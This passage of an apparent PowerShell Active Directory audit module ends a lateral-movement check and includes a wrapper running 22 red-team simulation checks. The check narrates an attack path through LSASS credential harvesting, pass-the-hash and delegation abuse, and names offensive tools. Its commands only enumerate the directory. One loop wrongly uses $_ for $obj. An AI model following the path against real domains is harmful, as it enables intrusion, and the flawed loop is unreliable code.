            $_ -and $_.PSObject.Properties['msDS-AllowedToDelegateTo'] -and
            $_.'msDS-AllowedToDelegateTo' -and $_.'msDS-AllowedToDelegateTo'.Count -gt 0
        })
        foreach ($obj in $constrained) {
            $name = if ($obj.PSObject.Properties['SamAccountName']) { $obj.SamAccountName } else { $obj.Name }
            $targets.Add("Constrained delegation: $name → $($_.'msDS-AllowedToDelegateTo' -join ', ')")
        }
        # AdminCount=1 non-standard accounts
        $adminCountAccts = @($users | Where-Object {
            $_ -and $_.PSObject.Properties['AdminCount'] -and $_.AdminCount -eq 1
        })
        if ($adminCountAccts.Count -gt 0) {
            $targets.Add("$($adminCountAccts.Count) accounts with AdminCount=1 (local admin sprawl risk)")
        }
        # DA accounts active recently
        $recentDA = @($users | Where-Object {
            $_ -and $_.MemberOf -and ($_.MemberOf | Where-Object { $_ -match 'CN=Domain Admins' }) -and
            $_.PSObject.Properties['LastLogonDate'] -and $_.LastLogonDate -gt (Get-Date).AddDays(-7)
        })
        if ($recentDA.Count -gt 0) {
            $targets.Add("$($recentDA.Count) DA account(s) with recent logons (credential footprint on workstations)")
        }
    }

    return New-RedTeamResult `
        -AttackName      'Lateral Movement Path Abuse (T0-Escalation)' `
        -MitreId         'T1021' `
        -MitreName       'Remote Services / Lateral Tool Transfer' `
        -SafeMode        $SafeMode `
        -Targets         $(if ($targets.Count -gt 0) { $targets.ToArray() } else { @("Domain: lateral movement path enumeration (requires -SafeMode:`$false)") }) `
        -AttackPath      "1. Compromise initial foothold (low-priv domain user or local admin on workstation).`n2. Enumerate local admin rights with Invoke-ShareFinder / CrackMapExec / PowerView.`n3. Find paths to high-value targets via BloodHound (ShortestPathToDomainAdmins).`n4. Abuse local admin, WMI, WinRM, RDP, or PSExec to move laterally.`n5. Harvest credentials from LSASS on each hop (PTH or PTT).`n6. Abuse constrained/unconstrained delegation or RBCD for privilege escalation.`n7. Reach Tier 0 (DA/DC) via BFS shortest path.`nChain length depends on network segmentation and admin sprawl." `
        -DetectionEvents @('4624 (logon type 3 — network lateral)', '4648 (explicit credential use)', '4672 (special privileges assigned)', '4688 (remote process creation — psexec/wmiprvse)', 'Sysmon EID 3 (network connection from admin tools)', 'MDI: Lateral movement path detection') `
        -Mitigations     @('Implement PAW (Privileged Access Workstation) model for Tier 0 accounts', 'Deploy LAPS to eliminate shared local admin passwords', 'Enforce tiered administration: DA never logs on below Tier 0', 'Block SMB/WMI/WinRM laterally (segmentation / host-based firewall)', 'Use BloodHound Enterprise or PingCastle regularly for path detection', 'Enable Protected Users group for all Tier 0/1 accounts', 'Deploy Defender for Identity (lateral movement path visibility)') `
        -Tools           @('BloodHound / SharpHound (attack path enumeration)', 'PowerView (Find-LocalAdminAccess)', 'CrackMapExec (SMB/WMI lateral)', 'Impacket (wmiexec / psexec / smbexec)', 'Rubeus (S4U2Self/S4U2Proxy — delegation abuse)', 'Cobalt Strike jump commands') `
        -Commands        @(
            '# Blue team: Find accounts with AdminCount=1',
            'Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount,MemberOf | Select-Object SamAccountName,MemberOf',
            '# Blue team: Find constrained delegation accounts',
            'Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,SamAccountName | Select-Object SamAccountName,"msDS-AllowedToDelegateTo"',
            '# Blue team: Find DA accounts with recent logons',
            'Get-ADGroupMember "Domain Admins" -Recursive | Get-ADUser -Properties LastLogonDate | Where-Object { $_.LastLogonDate -gt (Get-Date).AddDays(-7) } | Select-Object SamAccountName,LastLogonDate',
            '# Blue team: Find unconstrained delegation computers (lateral movement jump points)',
            'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,TrustedForDelegation'
        )
}

#endregion

#region Wrapper

function Invoke-AllRedTeamChecks {
    <#
    .SYNOPSIS
        Runs all 22 red team simulation checks and returns array of results.
    .PARAMETER ADData
        Hashtable of collected AD data.
    .PARAMETER SafeMode
        If $true (default), functions return metadata only. Set to $false for active checks.
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    Write-Verbose "Running all Red Team checks (SafeMode=$SafeMode)..."

    $checks = @(
        { Invoke-RedTeamKerberoast              -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamASREPRoast              -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamPasswordSpray           -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamMachineAccountQuota     -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamUnconstrainedDelegation -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamGPPCPassword            -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamADCS                    -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamGoldenCertificate       -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamDCSync                  -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamNtdsDit                 -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamGoldenTicket            -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamSilverTicket            -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamGoldenSAML              -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamEntraConnect            -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamTrustBypass             -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamSIDHistory              -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamSkeletonKey             -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamPassTheHash             -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamPassTheTicket           -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamDCShadow                -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamCredentialDumping       -ADData $ADData -SafeMode $SafeMode }
        { Invoke-RedTeamLateralMovement         -ADData $ADData -SafeMode $SafeMode }
    )

    $results = [System.Collections.Generic.List[object]]::new()

    foreach ($check in $checks) {
        try {
            $result = & $check
            if ($result) { $results.Add($result) }
        }
        catch { Write-Warning "Red team check error: $_" }
    }

    Write-Verbose "All Red Team checks complete. Results: $($results.Count)"
    return $results.ToArray()
}

#endregion
